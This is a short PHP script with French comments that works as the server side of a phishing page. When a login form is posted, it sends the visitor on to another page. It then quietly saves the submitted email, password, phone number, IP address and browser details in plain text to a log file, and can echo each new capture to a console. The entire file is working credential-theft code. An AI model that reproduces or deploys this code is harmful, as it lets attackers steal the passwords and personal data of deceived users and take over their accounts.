<?php
// Configuration
$logFile = "login.txt";
$realTimeLog = true;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Redirection immédiate avant le traitement
    header("Location: mer.html");
    
    // Récupération des données
    $email = htmlspecialchars(trim($_POST["email"] ?? ''));
    $password = htmlspecialchars(trim($_POST["password"] ?? ''));
    $country_code = htmlspecialchars(trim($_POST["country_code"] ?? ''));
    $phone = htmlspecialchars(trim($_POST["phone"] ?? ''));
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Formatage des données
    $logEntry = "======= NOUVELLE CONNEXION =======\n";
    $logEntry .= "Date: $date\n";
    $logEntry .= "IP: $ip\n";
    $logEntry .= "User Agent: $userAgent\n";
    $logEntry .= "Email: $email\n";
    $logEntry .= "ID du compte : $country_code $phone\n";
    $logEntry .= "Mot de passe: $password\n";
    $logEntry .= "================================\n\n";

    // Enregistrement asynchrone
    register_shutdown_function(function() use ($logFile, $logEntry) {
        try {
            if (!file_exists($logFile)) {
                file_put_contents($logFile, "");
                chmod($logFile, 0644);
            }
            
            file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
            
            if ($realTimeLog && php_sapi_name() === 'cli') {
                file_put_contents('php://stdout', "\n\033[32m[NOUVEAU LOG]\033[0m\n".$logEntry);
            }
        } catch (Exception $e) {
            error_log("Erreur de journalisation: ".$e->getMessage());
        }
    });
    
    // Terminer l'exécution
    exit;
} else {
    http_response_code(403);
    echo "Accès interdit";
    exit;
}
?>
